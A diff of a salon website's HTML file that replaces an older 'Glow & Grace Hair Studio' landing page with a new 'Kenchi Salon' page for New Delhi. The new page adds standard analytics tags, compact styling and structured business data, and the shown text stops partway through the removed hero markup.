@@ -1,1630 +1,376 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Glow & Grace Hair Studio</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    :root {
-      --bg: #0f172a;
-      --bg-soft: #111827;
-      --accent: #f97316;
-      --accent-soft: rgba(249, 115, 22, 0.1);
-      --text: #f9fafb;
-      --muted: #9ca3af;
-      --border: #1f2937;
-      --card: #020617;
-      --shadow-soft: 0 18px 45px rgba(0, 0, 0, 0.4);
-      --radius-xl: 1.5rem;
-      --radius-lg: 1rem;
-      --radius-full: 999px;
-      --blur-bg: blur(16px);
-      --transition-fast: 0.2s ease;
-      --transition-med: 0.3s ease;
-    }
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Kenchi Salon — Haircuts, Colouring & Styling in New Delhi</title>
+<meta name="description" content="Kenchi Salon in New Delhi offers expert haircuts, professional colouring, keratin treatments, blowouts and men's grooming. Call +91 99101 70356 to book."/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<!-- Google Analytics (gtag) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VCBLXTQNVQ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-VCBLXTQNVQ');
+</script>
+
+<!-- StatCounter (final) -->
+<script type="text/javascript">
+var sc_project=13188833; 
+var sc_invisible=1; 
+var sc_security="4224cf98"; 
+</script>
+<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+<noscript>
+  <div class="statcounter"><a title="Web Analytics Made Easy - Statcounter" href="https://statcounter.com/" target="_blank">
+    <img class="statcounter" src="https://c.statcounter.com/13188833/0/4224cf98/1/" alt="Web Analytics Made Easy - Statcounter" referrerPolicy="no-referrer-when-downgrade">
+  </a></div>
+</noscript>
+
+<style>
+:root { --accent:#b04a8a; --muted:#6b7280; --bg:#fcfbfc; --card:#fff; font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial; }
+* { box-sizing:border-box }
+body { margin:0; background:var(--bg); color:#0f172a; line-height:1.5 }
+a { color:inherit }
+.header { background:#fff; border-bottom:1px solid #f3e8f0; position:sticky; top:0; z-index:50 }
+.header .inner { max-width:1100px; margin:0 auto; padding:14px 20px; display:flex; justify-content:space-between; align-items:center }
+.brand { font-weight:800; color:var(--accent); font-size:20px }
+.phone a { font-weight:700; color:var(--accent); text-decoration:none }
+.container { max-width:1100px; margin:28px auto; padding:0 20px }
+.hero { display:grid; grid-template-columns:1fr 340px; gap:22px; align-items:start }
+.lead { color:var(--muted); margin-top:6px }
+.cta { display:flex; gap:10px; margin-top:12px; flex-wrap:wrap }
+.btn { background:var(--accent); color:white; padding:10px 14px; border-radius:8px; text-decoration:none; font-weight:700 }
+.card { background:var(--card); padding:16px; border-radius:12px; border:1px solid #f3e8f0 }
+.services { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:14px; margin-top:18px }
+.price-grid { display:flex; gap:12px; margin-top:18px; flex-wrap:wrap }
+.price { flex:1; min-width:220px; padding:16px; border-radius:10px; background:var(--card); border:1px solid #f3e8f0 }
+.grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:18px }
+.gallery { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:8px; margin-top:12px }
+blockquote { font-style:italic; color:#2b2b2b; background:#fff; padding:12px; border-left:4px solid var(--accent); border-radius:8px }
+.faq h4 { margin:10px 0 6px }
+footer { margin-top:26px; padding:18px; text-align:center; color:var(--muted); font-size:14px }
+@media(max-width:880px){ .hero{grid-template-columns:1fr} .hero aside{order:2} }
+
+/* Cookie modal styles */
+#cookieModalOverlay {
+  position:fixed; inset:0; background:rgba(0,0,0,0.55);
+  display:flex; justify-content:center; align-items:center;
+  z-index:99999; padding:20px;
+}
+#cookieModal {
+  background:#fff; max-width:420px; width:100%; padding:22px;
+  border-radius:12px; text-align:center; font-family:Inter, sans-serif;
+  box-shadow:0 8px 30px rgba(2,6,23,0.2);
+}
+#cookieModal h2 { margin-top:0; color:var(--accent); font-size:20px; }
+#cookieModal p { color:#374151; font-size:15px; margin:10px 0 16px; }
+.countdown-timer { font-size:14px; color:#666; margin-top:10px; font-weight:600; }
+.cookie-btn { padding:10px 18px; border-radius:8px; font-weight:600; font-size:15px; cursor:pointer; }
+.cookie-accept { background:var(--accent); color:white; border:0; }
+.cookie-deny { background:white; color:var(--accent); border:2px solid var(--accent); }
+
+/* visually hide element technique for focus trapping (if needed) */
+.visually-hidden { position: absolute !important; height: 1px; width: 1px; overflow: hidden; clip: rect(1px, 1px, 1px, 1px); white-space: nowrap; }
+</style>
+
+<!-- SEO Structured Data -->
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"BeautySalon",
+  "name":"Kenchi Salon",
+  "url":"https://kenchi-salon.netlify.app",
+  "telephone":"+919910170356",
+  "priceRange":"₹₹",
+  "address":{
+    "@type":"PostalAddress",
+    "streetAddress":"Kenchi Salon, New Delhi",
+    "addressLocality":"New Delhi",
+    "addressCountry":"IN"
+  },
+  "openingHours":"Mo-Sa 10:00-20:00, Su 11:00-18:00",
+  "description":"Kenchi Salon provides professional haircuts, colouring, keratin treatments and styling in New Delhi."
+}
+</script>
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text",
-        "Segoe UI", sans-serif;
-      background: radial-gradient(circle at top, #1d2538 0, #020617 50%, #000 100%);
-      color: var(--text);
-      line-height: 1.5;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    a {
-      color: inherit;
-      text-decoration: none;
-    }
-
-    img {
-      max-width: 100%;
-      display: block;
-    }
-
-    /* Layout */
-
-    .page {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 1120px;
-      margin: 0 auto;
-      padding: 0 1.5rem;
-    }
-
-    /* Nav */
-
-    .nav {
-      position: sticky;
-      top: 0;
-      z-index: 100;
-      backdrop-filter: blur(22px);
-      background: linear-gradient(
-        to bottom,
-        rgba(15, 23, 42, 0.95),
-        rgba(15, 23, 42, 0.8),
-        transparent
-      );
-      border-bottom: 1px solid rgba(148, 163, 184, 0.1);
-    }
-
-    .nav-inner {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0.75rem 1.5rem;
-      gap: 1rem;
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-    }
-
-    .brand-logo {
-      width: 40px;
-      height: 40px;
-      border-radius: 18px;
-      background: radial-gradient(circle at 20% 20%, #f97316, #ea580c);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff7ed;
-      font-weight: 700;
-      box-shadow: 0 12px 28px rgba(249, 115, 22, 0.5);
-    }
-
-    .brand-text {
-      display: flex;
-      flex-direction: column;
-    }
-
-    .brand-text span:first-child {
-      font-weight: 600;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-      font-size: 0.85rem;
-    }
-
-    .brand-text span:last-child {
-      font-size: 0.75rem;
-      color: var(--muted);
-    }
-
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 1.5rem;
-    }
-
-    .nav-links a {
-      font-size: 0.9rem;
-      color: var(--muted);
-      position: relative;
-      padding-bottom: 0.25rem;
-      transition: color var(--transition-fast);
-    }
-
-    .nav-links a::after {
-      content: "";
-      position: absolute;
-      left: 0;
-      bottom: 0;
-      width: 0;
-      height: 2px;
-      border-radius: 999px;
-      background: linear-gradient(to right, #f97316, #f97316, transparent);
-      transition: width var(--transition-fast);
-    }
-
-    .nav-links a:hover {
-      color: var(--text);
-    }
-
-    .nav-links a:hover::after {
-      width: 50%;
-    }
-
-    .nav-cta {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem;
-    }
-
-    .nav-phone {
-      display: none;
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-
-    .pill {
-      padding: 0.55rem 1.3rem;
-      border-radius: var(--radius-full);
-      border: 1px solid rgba(249, 115, 22, 0.65);
-      background: radial-gradient(circle at top left, #f973160f, transparent);
-      font-size: 0.8rem;
-      font-weight: 500;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.45rem;
-      cursor: pointer;
-      transition: all var(--transition-med);
-    }
-
-    .pill span.icon {
-      font-size: 1rem;
-      transform: translateY(1px);
-    }
-
-    .pill:hover {
-      background: linear-gradient(to right, #f9731620, transparent);
-      box-shadow: 0 10px 25px rgba(249, 115, 22, 0.35);
-      transform: translateY(-1px);
-    }
-
-    /* Mobile nav */
-
-    .nav-toggle {
-      display: none;
-      width: 32px;
-      height: 32px;
-      border-radius: 999px;
-      border: 1px solid rgba(148, 163, 184, 0.5);
-      background: rgba(15, 23, 42, 0.6);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-    }
-
-    .nav-toggle span {
-      width: 16px;
-      height: 2px;
-      background: #e5e7eb;
-      border-radius: 999px;
-      position: relative;
-    }
-
-    .nav-toggle span::before,
-    .nav-toggle span::after {
-      content: "";
-      position: absolute;
-      left: 0;
-      width: 16px;
-      height: 2px;
-      border-radius: 999px;
-      background: #e5e7eb;
-      transition: transform var(--transition-fast), opacity var(--transition-fast);
-    }
-
-    .nav-toggle span::before {
-      top: -5px;
-    }
-
-    .nav-toggle span::after {
-      top: 5px;
-    }
-
-    .nav-toggle.active span {
-      background: transparent;
-    }
-
-    .nav-toggle.active span::before {
-      transform: translateY(5px) rotate(45deg);
-    }
-
-    .nav-toggle.active span::after {
-      transform: translateY(-5px) rotate(-45deg);
-    }
-
-    .nav-links-mobile {
-      display: none;
-      flex-direction: column;
-      gap: 0.75rem;
-      padding: 0 1.5rem 1rem;
-      background: rgba(15, 23, 42, 0.97);
-      border-bottom: 1px solid rgba(148, 163, 184, 0.2);
-    }
-
-    .nav-links-mobile a {
-      font-size: 0.95rem;
-      color: var(--muted);
-    }
-
-    /* Hero */
-
-    .hero {
-      padding: 3.5rem 0 3.5rem;
-    }
-
-    .hero-inner {
-      display: grid;
-      grid-template-columns: minmax(0, 1.4fr) minmax(0, 1fr);
-      gap: 2.5rem;
-      align-items: center;
-    }
-
-    .hero-left {
-      display: flex;
-      flex-direction: column;
-      gap: 1.75rem;
-    }
-
-    .hero-pill {
-      align-self: flex-start;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.35rem;
-      font-size: 0.75rem;
-      padding: 0.25rem 0.5rem;
-      border-radius: 999px;
-      background: rgba(15, 23, 42, 0.9);
-      border: 1px solid rgba(148, 163, 184, 0.5);
-    }
-
-    .hero-pill span.dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 999px;
-      background: #22c55e;
-      box-shadow: 0 0 12px #22c55e;
-    }
-
-    .hero-title {
-      font-size: clamp(2.4rem, 4vw, 3.2rem);
-      line-height: 1.1;
-      letter-spacing: -0.04em;
-    }
-
-    .hero-title span.accent {
-      background: linear-gradient(to right, #f97316, #fb923c, #fed7aa);
-      -webkit-background-clip: text;
-      color: transparent;
-    }
-
-    .hero-subtitle {
-      color: var(--muted);
-      max-width: 32rem;
-      font-size: 0.95rem;
-    }
-
-    .hero-actions {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.9rem;
-      align-items: center;
-    }
-
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.45rem;
-      padding: 0.75rem 1.5rem;
-      border-radius: var(--radius-full);
-      font-size: 0.9rem;
-      font-weight: 500;
-      border: 1px solid transparent;
-      cursor: pointer;
-      transition: all var(--transition-med);
-      background: transparent;
-      color: var(--text);
-    }
-
-    .btn-primary {
-      background: linear-gradient(135deg, #f97316, #ea580c);
-      box-shadow: 0 18px 35px rgba(249, 115, 22, 0.45);
-    }
-
-    .btn-primary:hover {
-      transform: translateY(-1px) scale(1.01);
-      box-shadow: 0 22px 45px rgba(249, 115, 22, 0.55);
-    }
-
-    .btn-outline {
-      border-color: rgba(148, 163, 184, 0.7);
-      background: rgba(15, 23, 42, 0.8);
-    }
-
-    .btn-outline:hover {
-      border-color: rgba(249, 115, 22, 0.75);
-      background: rgba(15, 23, 42, 0.95);
-      box-shadow: 0 8px 25px rgba(15, 23, 42, 0.8);
-    }
-
-    .hero-meta {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1.5rem;
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-
-    .hero-meta-item {
-      display: flex;
-      flex-direction: column;
-      gap: 0.25rem;
-    }
-
-    .hero-meta-item strong {
-      font-size: 1.1rem;
-      color: #e5e7eb;
-    }
-
-    /* Hero right */
-
-    .hero-right {
-      display: flex;
-      justify-content: center;
-    }
-
-    .hero-card {
-      position: relative;
-      width: 100%;
-      max-width: 360px;
-      border-radius: 2rem;
-      padding: 1.5rem;
-      background: radial-gradient(circle at top, #020617, #020617f0 40%, #020617);
-      border: 1px solid rgba(148, 163, 184, 0.4);
-      box-shadow: var(--shadow-soft);
-      overflow: hidden;
-    }
-
-    .hero-glow {
-      position: absolute;
-      inset: -40%;
-      background:
-        radial-gradient(circle at top, rgba(248, 250, 252, 0.05), transparent 55%),
-        radial-gradient(circle at 80% 90%, rgba(249, 115, 22, 0.12), transparent 50%),
-        radial-gradient(circle at 0% 0%, rgba(6, 182, 212, 0.12), transparent 55%);
-      opacity: 0.9;
-      pointer-events: none;
-    }
-
-    .hero-card-content {
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      gap: 1.25rem;
-    }
-
-    .hero-photo {
-      position: relative;
-      border-radius: 1.5rem;
-      overflow: hidden;
-      border: 1px solid rgba(148, 163, 184, 0.5);
-      background: radial-gradient(circle at top, #f97316, #020617 50%, #020617);
-      height: 210px;
-      display: flex;
-      align-items: flex-end;
-      justify-content: flex-end;
-      padding: 1.5rem;
-      isolation: isolate;
-    }
-
-    .hero-photo::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background:
-        radial-gradient(circle at 10% 10%, rgba(248, 250, 252, 0.14), transparent 55%),
-        radial-gradient(circle at 80% 0%, rgba(251, 146, 60, 0.28), transparent 60%),
-        radial-gradient(circle at 0% 100%, rgba(6, 182, 212, 0.18), transparent 60%);
-      mix-blend-mode: screen;
-      opacity: 0.75;
-    }
-
-    .hero-photo-figure {
-      position: relative;
-      width: 95px;
-      height: 170px;
-      border-radius: 999px;
-      border: 1px solid rgba(248, 250, 252, 0.3);
-      background: linear-gradient(180deg, #fef3c7, #f97316 50%, #1f2937 100%);
-      box-shadow:
-        0 18px 50px rgba(15, 23, 42, 0.9),
-        0 0 0 1px rgba(15, 23, 42, 0.9);
-      overflow: hidden;
-    }
-
-    .hero-photo-figure::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background:
-        radial-gradient(circle at 50% 18%, #451a03, transparent 60%),
-        radial-gradient(circle at 50% 30%, #f97316, transparent 55%);
-      opacity: 0.6;
-      mix-blend-mode: multiply;
-    }
-
-    .hero-photo-figure::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background:
-        radial-gradient(circle at 50% 10%, rgba(248, 250, 252, 0.1), transparent 60%),
-        linear-gradient(to top, transparent 40%, rgba(248, 250, 252, 0.15));
-      opacity: 0.9;
-      mix-blend-mode: screen;
-    }
-
-    .hero-stats {
-      position: absolute;
-      left: 1.1rem;
-      bottom: 1.15rem;
-      display: flex;
-      flex-direction: column;
-      gap: 0.5rem;
-      width: 152px;
-    }
-
-    .hero-stat-pill {
-      padding: 0.55rem 0.7rem;
-      border-radius: 999px;
-      background: rgba(15, 23, 42, 0.9);
-      border: 1px solid rgba(148, 163, 184, 0.7);
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.7rem;
-    }
-
-    .hero-stat-pill strong {
-      font-size: 0.8rem;
-    }
-
-    .hero-chip-row {
-      display: flex;
-      gap: 0.5rem;
-      flex-wrap: wrap;
-    }
-
-    .hero-chip {
-      padding: 0.18rem 0.6rem;
-      border-radius: 999px;
-      border: 1px solid rgba(148, 163, 184, 0.6);
-      font-size: 0.65rem;
-      background: rgba(15, 23, 42, 0.95);
-      white-space: nowrap;
-    }
-
-    .hero-card-footer {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 0.75rem;
-      font-size: 0.75rem;
-      color: var(--muted);
-    }
-
-    .hero-card-footer strong {
-      color: #e5e7eb;
-      font-size: 0.9rem;
-    }
-
-    .badge {
-      padding: 0.3rem 0.7rem;
-      border-radius: 999px;
-      background: rgba(22, 163, 74, 0.12);
-      border: 1px solid rgba(34, 197, 94, 0.6);
-      color: #bbf7d0;
-      font-size: 0.7rem;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.35rem;
-      white-space: nowrap;
-    }
-
-    .badge span.dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 999px;
-      background: #22c55e;
-      box-shadow: 0 0 10px #22c55e;
-    }
-
-    /* Section base */
-
-    section {
-      padding: 2.75rem 0;
-    }
-
-    .section-heading {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-      gap: 1.5rem;
-      margin-bottom: 2rem;
-      flex-wrap: wrap;
-    }
-
-    .section-title {
-      font-size: 1.4rem;
-      letter-spacing: -0.02em;
-    }
-
-    .section-kicker {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.18em;
-      color: var(--muted);
-      margin-bottom: 0.4rem;
-    }
-
-    .section-subtitle {
-      font-size: 0.85rem;
-      color: var(--muted);
-      max-width: 25rem;
-    }
-
-    .tag-row {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.4rem;
-    }
-
-    .tag {
-      padding: 0.2rem 0.6rem;
-      border-radius: 999px;
-      border: 1px solid rgba(148, 163, 184, 0.5);
-      background: rgba(15, 23, 42, 0.9);
-      font-size: 0.7rem;
-      color: var(--muted);
-    }
-
-    /* Services */
-
-    .card-grid {
-      display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 1.5rem;
-    }
-
-    .card {
-      border-radius: var(--radius-xl);
-      padding: 1.4rem;
-      background: radial-gradient(circle at top, #020617, #020617f5 50%, #020617);
-      border: 1px solid var(--border);
-      box-shadow: 0 16px 34px rgba(15, 23, 42, 0.75);
-      display: flex;
-      flex-direction: column;
-      gap: 0.6rem;
-      transition: transform var(--transition-fast), box-shadow var(--transition-fast),
-        border-color var(--transition-fast), background var(--transition-fast);
-    }
-
-    .card:hover {
-      transform: translateY(-4px);
-      border-color: rgba(249, 115, 22, 0.6);
-      box-shadow: 0 22px 55px rgba(15, 23, 42, 0.9);
-      background: radial-gradient(circle at top, #0b1120, #020617 50%, #000);
-    }
-
-    .card-icon {
-      width: 42px;
-      height: 42px;
-      border-radius: 18px;
-      background: rgba(15, 23, 42, 0.9);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.15rem;
-      margin-bottom: 0.35rem;
-      border: 1px solid rgba(148, 163, 184, 0.6);
-    }
-
-    .card h3 {
-      font-size: 1rem;
-    }
-
-    .card p {
-      font-size: 0.85rem;
-      color: var(--muted);
-    }
-
-    .card-footer {
-      margin-top: 0.6rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-
-    .chip {
-      padding: 0.15rem 0.5rem;
-      border-radius: 999px;
-      border: 1px solid rgba(148, 163, 184, 0.6);
-      font-size: 0.7rem;
-    }
-
-    /* Stylists */
-
-    .stylist-grid {
-      display: grid;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      gap: 1.5rem;
-    }
-
-    .stylist-card {
-      border-radius: var(--radius-xl);
-      padding: 1rem;
-      background: rgba(15, 23, 42, 0.9);
-      border: 1px solid var(--border);
-      box-shadow: 0 16px 34px rgba(15, 23, 42, 0.85);
-      display: flex;
-      flex-direction: column;
-      gap: 0.75rem;
-      transition: transform var(--transition-fast), box-shadow var(--transition-fast),
-        border-color var(--transition-fast), background var(--transition-fast);
-    }
-
-    .stylist-card:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 22px 50px rgba(15, 23, 42, 0.95);
-      border-color: rgba(249, 115, 22, 0.7);
-      background: radial-gradient(circle at top, #020617, #020617f5 55%, #020617);
-    }
-
-    .avatar {
-      position: relative;
-      width: 72px;
-      height: 72px;
-      border-radius: 999px;
-      background: radial-gradient(circle at top, #f97316, #020617 65%, #020617);
-      border: 1px solid rgba(148, 163, 184, 0.7);
-      overflow: hidden;
-    }
-
-    .avatar::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background:
-        radial-gradient(circle at 50% 25%, #f97316, transparent 55%),
-        linear-gradient(to top, transparent 35%, rgba(248, 250, 252, 0.12));
-      mix-blend-mode: screen;
-      opacity: 0.9;
-    }
-
-    .stylist-header {
-      display: flex;
-      gap: 0.75rem;
-      align-items: center;
-    }
-
-    .stylist-info h3 {
-      font-size: 0.95rem;
-    }
-
-    .stylist-info span {
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-
-    .stylist-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.35rem;
-      font-size: 0.7rem;
-      color: var(--muted);
-    }
-
-    .rating {
-      display: flex;
-      align-items: center;
-      gap: 0.25rem;
-      font-size: 0.75rem;
-      color: #fde68a;
-    }
-
-    /* Pricing */
-
-    .pricing-grid {
-      display: grid;
-      grid-template-columns: minmax(0, 1.1fr) minmax(0, 1fr);
-      gap: 1.75rem;
-      align-items: flex-start;
-    }
-
-    .price-list {
-      border-radius: var(--radius-xl);
-      padding: 1.3rem 1.3rem 1rem;
-      background: rgba(15, 23, 42, 0.92);
-      border: 1px solid rgba(148, 163, 184, 0.5);
-      box-shadow: 0 16px 38px rgba(15, 23, 42, 0.95);
-    }
-
-    .price-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: baseline;
-      padding: 0.55rem 0;
-      border-bottom: 1px dashed rgba(55, 65, 81, 0.7);
-      font-size: 0.85rem;
-      color: var(--muted);
-    }
-
-    .price-item:last-child {
-      border-bottom: none;
-    }
-
-    .price-item span.label {
-      color: #e5e7eb;
-    }
-
-    .price-item span.amount {
-      font-weight: 600;
-      color: #fbbf24;
-    }
-
-    .price-note {
-      margin-top: 0.75rem;
-      font-size: 0.75rem;
-      color: var(--muted);
-    }
-
-    .pricing-highlight {
-      border-radius: var(--radius-xl);
-      padding: 1.3rem 1.3rem 1.1rem;
-      border: 1px solid rgba(249, 115, 22, 0.65);
-      background: radial-gradient(circle at top, #f9731615, #020617f5 55%, #020617);
-      box-shadow: 0 20px 45px rgba(15, 23, 42, 0.95);
-      display: flex;
-      flex-direction: column;
-      gap: 0.8rem;
-      font-size: 0.85rem;
-    }
-
-    .pricing-highlight h3 {
-      font-size: 1rem;
-    }
-
-    .pricing-highlight strong {
-      color: #f97316;
-    }
-
-    .pricing-perks {
-      display: flex;
-      flex-direction: column;
-      gap: 0.4rem;
-      font-size: 0.78rem;
-    }
-
-    .pricing-perks div {
-      display: flex;
-      gap: 0.4rem;
-      align-items: flex-start;
-    }
-
-    .pricing-perks span.bullet {
-      font-size: 0.9rem;
-      margin-top: -0.05rem;
-    }
-
-    /* Booking */
-
-    .booking {
-      padding-bottom: 3.2rem;
-    }
-
-    .booking-grid {
-      display: grid;
-      grid-template-columns: minmax(0, 1.1fr) minmax(0, 1fr);
-      gap: 1.8rem;
-    }
-
-    .form-card {
-      border-radius: var(--radius-xl);
-      padding: 1.3rem 1.4rem;
-      background: rgba(15, 23, 42, 0.96);
-      border: 1px solid rgba(148, 163, 184, 0.5);
-      box-shadow: 0 18px 40px rgba(15, 23, 42, 0.95);
-    }
-
-    .form-row {
-      display: flex;
-      gap: 0.9rem;
-      margin-bottom: 0.85rem;
-      flex-wrap: wrap;
-    }
-
-    .form-field {
-      flex: 1 1 140px;
-      display: flex;
-      flex-direction: column;
-      gap: 0.25rem;
-    }
-
-    label {
-      font-size: 0.78rem;
-      color: var(--muted);
-    }
-
-    input,
-    select,
-    textarea {
-      background: #020617;
-      border-radius: 0.8rem;
-      border: 1px solid rgba(55, 65, 81, 0.9);
-      padding: 0.55rem 0.75rem;
-      color: var(--text);
-      font-size: 0.84rem;
-      outline: none;
-      transition: border-color var(--transition-fast), box-shadow var(--transition-fast),
-        background var(--transition-fast), transform var(--transition-fast);
-      font-family: inherit;
-    }
-
-    input:focus,
-    select:focus,
-    textarea:focus {
-      border-color: rgba(249, 115, 22, 0.9);
-      box-shadow: 0 0 0 1px rgba(249, 115, 22, 0.7);
-      background: #020617;
-      transform: translateY(-1px);
-    }
-
-    textarea {
-      resize: vertical;
-      min-height: 80px;
-    }
-
-    .form-footer {
-      margin-top: 0.9rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 0.75rem;
-      flex-wrap: wrap;
-      font-size: 0.78rem;
-      color: var(--muted);
-    }
-
-    .form-footer small {
-      max-width: 16rem;
-    }
-
-    .booking-info {
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
-      font-size: 0.85rem;
-      color: var(--muted);
-    }
-
-    .info-card {
-      border-radius: var(--radius-xl);
-      padding: 1rem 1.1rem;
-      background: rgba(15, 23, 42, 0.98);
-      border: 1px solid rgba(55, 65, 81, 0.9);
-      display: flex;
-      flex-direction: column;
-      gap: 0.6rem;
-    }
-
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      gap: 1rem;
-      font-size: 0.8rem;
-    }
-
-    .info-row strong {
-      color: #e5e7eb;
-    }
-
-    .info-note {
-      font-size: 0.78rem;
-    }
-
-    /* Footer */
-
-    footer {
-      border-top: 1px solid rgba(55, 65, 81, 0.9);
-      padding: 1.3rem 0 1.5rem;
-      font-size: 0.75rem;
-      color: var(--muted);
-      background: radial-gradient(circle at bottom, #020617, #000);
-    }
-
-    .footer-inner {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-
-    .footer-links {
-      display: flex;
-      gap: 1.1rem;
-      flex-wrap: wrap;
-    }
-
-    .footer-links a {
-      color: var(--muted);
-    }
-
-    .footer-links a:hover {
-      color: #e5e7eb;
-    }
-
-    /* Responsive */
-
-    @media (max-width: 960px) {
-      .hero-inner {
-        grid-template-columns: minmax(0, 1.1fr);
-      }
-
-      .hero-right {
-        order: -1;
-      }
-
-      .card-grid,
-      .stylist-grid {
-        grid-template-columns: repeat(2, minmax(0, 1fr));
-      }
-
-      .pricing-grid,
-      .booking-grid {
-        grid-template-columns: minmax(0, 1fr);
-      }
-
-      .nav-phone {
-        display: inline-flex;
-      }
-    }
-
-    @media (max-width: 720px) {
-      .nav-inner {
-        padding-inline: 1rem;
-      }
-
-      .nav-links {
-        display: none;
-      }
-
-      .nav-toggle {
-        display: flex;
-      }
-
-      .hero {
-        padding-top: 2.3rem;
-      }
-
-      .container {
-        padding-inline: 1.1rem;
-      }
-
-      .card-grid,
-      .stylist-grid {
-        grid-template-columns: minmax(0, 1fr);
-      }
-
-      section {
-        padding: 2.15rem 0;
-      }
-
-      .section-heading {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-
-      .hero-card {
-        max-width: 100%;
-      }
-    }
-
-    @media (max-width: 480px) {
-      .hero-title {
-        font-size: 2.2rem;
-      }
-
-      .hero-actions {
-        flex-direction: column;
-        align-items: stretch;
-      }
-
-      .btn,
-      .pill {
-        width: 100%;
-        justify-content: center;
-      }
-
-      .form-row {
-        flex-direction: column;
-      }
-    }
-  </style>
 </head>
 <body>
-  <div class="page">
-    <!-- NAV -->
-    <header class="nav">
-      <div class="nav-inner">
-        <a href="#" class="brand">
-          <div class="brand-logo">GG</div>
-          <div class="brand-text">
-            <span>Glow &amp; Grace</span>
-            <span>Hair Studio</span>
-          </div>
-        </a>
-        <nav class="nav-links">
-          <a href="#services">Services</a>
-          <a href="#stylists">Stylists</a>
-          <a href="#pricing">Pricing</a>
-          <a href="#booking">Book</a>
-        </nav>
-        <div class="nav-cta">
-          <span class="nav-phone">Call: +91-98765-43210</span>
-          <button class="pill" onclick="scrollToSection('booking')">
-            <span class="icon">✂️</span>
-            <span>Book an appointment</span>
-          </button>
-          <button class="nav-toggle" id="navToggle">
-            <span></span>
-          </button>
-        </div>
-      </div>
-      <nav class="nav-links-mobile" id="navMobile">
-        <a href="#services" onclick="closeMobileNav()">Services</a>
-        <a href="#stylists" onclick="closeMobileNav()">Stylists</a>
-        <a href="#pricing" onclick="closeMobileNav()">Pricing</a>
-        <a href="#booking" onclick="closeMobileNav()">Book Now</a>
-      </nav>
-    </header>
 
-    <main>
-      <!-- HERO -->
-      <section class="hero">
-        <div class="container hero-inner">
-          <div class="hero-left">
-            <div class="hero-pill">
-              <span class="dot"></span>
-              <span>Now accepting new guests — limited slots daily</span>
-            </div>
-            <h1 class="hero-title">
-              Your hair, <span class="accent">perfected</span> with
-              tailored care.
-            </h1>
-            <p class="hero-subtitle">
-              Glow &amp; Grace is a boutique hair studio specialising in modern cuts,
-              lived-in colour and healthy hair rituals — crafted just for you.
-            </p>
-            <div class="hero-actions">
-              <button class="btn btn-primary" onclick="scrollToSection('booking')">
-                Book your first visit
-                <span>→</span>
-              </button>
-              <button class="btn btn-outline" onclick="scrollToSection('services')">
-                View services
-              </button>
-            </div>
-            <div class="hero-meta">
-              <div class="hero-meta-item">
-                <strong>1,200+</strong>
-                <span>Happy clients styled</span>
-              </div>
-              <div class="hero-meta-item">
-                <strong>4.9★</strong>
-                <span>Average Google rating</span>
-              </div>
-              <div class="hero-meta-item">
